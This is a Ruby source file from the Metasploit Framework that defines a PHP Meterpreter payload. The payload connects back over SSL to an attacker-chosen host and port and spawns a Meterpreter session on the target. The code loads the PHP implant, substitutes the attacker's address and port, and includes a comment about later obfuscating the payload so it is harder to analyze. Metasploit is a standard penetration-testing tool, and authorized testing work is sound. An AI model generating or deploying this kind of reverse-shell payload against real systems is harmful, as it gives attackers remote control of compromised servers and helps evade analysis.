##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'msf/core/handler/reverse_tcp_ssl'
require 'msf/base/sessions/meterpreter_php'
require 'msf/base/sessions/meterpreter_options'


module Metasploit3
	include Msf::Payload::Single
	include Msf::Sessions::MeterpreterOptions

	def initialize(info = {})
		super(update_info(info,
			'Name'          => 'PHP Meterpreter, Reverse TCP Inline using SSL',
			'Version'       => '$Revision$',
			'Description'   => 'Connect back to attacker and spawn a Meterpreter server (PHP)',
			'Author'        => ['RageLtMan'],
			'Platform'      => 'php',
			'Arch'          => ARCH_PHP,
			'Handler'       => Msf::Handler::ReverseTcpSsl,
			'License'       => MSF_LICENSE,
			'Session'       => Msf::Sessions::Meterpreter_Php_Php))
	end

	def generate
		file = File.join(Msf::Config.data_directory, "meterpreter", "meterpreter.php")
		met = File.open(file, "rb") {|f|
			f.read(f.stat.size)
		}
		met.gsub!("127.0.0.1", datastore['LHOST']) if datastore['LHOST']
		met.gsub!("4444", datastore['LPORT']) if datastore['LPORT']
		met.gsub!('($ipaddr, $port, $proto=\'tcp\')','($ipaddr, $port, $proto=\'ssl\')')
		# XXX When this payload is more stable, remove comments and compress
		# whitespace to make it smaller and a bit harder to analyze
		#met.gsub!(/#.*$/, '')
		#met = Rex::Text.compress(met)
		met
	end
end
